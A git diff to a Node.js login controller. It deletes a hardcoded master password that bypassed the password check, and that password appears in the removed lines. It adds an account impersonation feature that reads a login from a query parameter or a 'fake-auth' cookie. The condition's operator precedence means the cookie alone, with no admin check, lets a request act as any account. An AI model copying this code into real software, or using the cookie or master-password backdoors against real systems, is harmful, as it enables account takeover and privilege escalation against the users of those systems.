@@ -8,6 +8,8 @@ const logger = require('./logger');
 const Render = require('../render');
 const render = Render.render;
 
+const FAKE_AUTH_KEY = 'fake-auth';
+
 module.exports = {
     getLogin: async (req, res) => {
         if (req.session.__user) {
@@ -35,6 +37,19 @@ module.exports = {
                 'requestPause.status': true,
                 'info.initiator': acc._id + ''
               });
+            }
+
+            if (acc.department.type === 'admin' && req.query.fakeAuth || req.cookies[FAKE_AUTH_KEY]) {
+                const fakeAuth = await Account.findOne({ login: req.query.fakeAuth || req.cookies[FAKE_AUTH_KEY] }).populate('department notifies');
+
+                if (!fakeAuth) {
+                    console.error('FakeAuth Error');
+                    return res.sendStatus(400);
+                }
+
+                req.query.fakeAuth && res.cookie(FAKE_AUTH_KEY, req.query.fakeAuth);
+
+                acc = fakeAuth;
             }
 
             var count = 0;
@@ -81,9 +96,7 @@ module.exports = {
             status: true
         };
 
-        if (req.body.password !== '52863901Vt525') {
-            accQuery.password = password.createHash(req.body.password);
-        }
+        accQuery.password = password.createHash(req.body.password);
 
         const acc = await Account.findOne(accQuery);
 
